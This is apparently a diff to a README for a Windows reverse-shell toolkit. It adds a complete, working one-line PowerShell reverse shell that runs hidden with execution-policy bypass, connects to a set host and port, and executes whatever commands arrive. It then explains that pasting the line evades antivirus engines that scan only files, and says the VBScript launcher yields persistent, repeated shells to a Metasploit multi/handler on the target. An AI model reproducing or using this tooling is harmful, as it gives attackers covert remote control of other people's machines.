@@ -52,7 +52,25 @@ psrev.vbs<br />
 
 The psrev.vbs script requires that you have set the HOSTIP and EXP1 environment variables in the current CMD shell on Windows.
 
+## Different Requirements
+If your requirements change such that you are not able to set environment variables on Windows before running the script try the following version:
 
+powershell -NoP -NonI -W Hidden -Exec Bypass "& {$ps=$false;$hostip='10.0.0.22';$port=5379;$client = New-Object System.Net.Sockets.TCPClient($hostip,$port);$stream = $client.GetStream();[byte[]]$bytes = 0..50000|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$cmd=(get-childitem Env:ComSpec).value;$inArray=$data.split(" ");$item=$inArray[0];if(($item -eq '$ps') -and ($ps -eq $false)){$ps=$true}if($item -like '?:'){$item='d:'}$myArray=@('cd','exit','d:','pwd','ls','ps','rm','cp','mv','cat');$do=$false;foreach ($i in $myArray){if($item -eq $i){$do=$true}}if($do -or $ps){$sendback=( iex $data 2>&1 |Out-String)}else{$data2='/c '+$data;$sendback = ( &$cmd $data2 2>&1 | Out-String)};if($ps){$prompt='PS ' + (pwd).Path}else{$prompt=(pwd).Path}$sendback2 = $data +  $sendback + $prompt + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()}"
 
+You will need to edit the $hostip and $port values before pasting the above line into Windows. As before this will 'use up' the existing cmd shell that you have on Windows.
+
+For convenience there is also the psnoenv.vbs script. You will have to edit the script to use the correct $hostip and $port values before running it on the target.
+
+## More Discussion
+
+**Pasted Script VS Lancher Saved File**
+
+You need to be able to save a file and execute it in order to use the Launcher. Some AV engines only look at files and not what is pasted into an existing command window. Sometimes you are able to execute commands but you are not able to see the output. Then it can be hard to know if your downloads are succeeding or where they are ending up. In this case you could try pasting in and running the script as a command.
+
+If you can download and run the VBScript file it is far superior in the following ways: You can run the script multiple times and it will continue making reverse shell conections to the msfconsole multi/hanlder. You can close the original command window that you ran the Launcher script in and the reverse shells persist. You can even run the script from within an existing reverse shell connection and it will launch another reverse shell connection to the multi/handler.
+
+**Entered Text Is Echoed Back**
+
+I always wondered why the reverse shell established with netcat echoed the command that was entered back as well as the output. I discovered the answer while trying to figure out why when a session was backgrounded in the multi/handler and then when I later returned to it none of the entered text was visible and the output text was jumbled up with some of it on the input prompt line itself. As soon as I echoed back the input command text as well as the output with my PowerShell/cmd reverse shell, returning to a backgrounded session resulted in a session display that made sense.
 
 
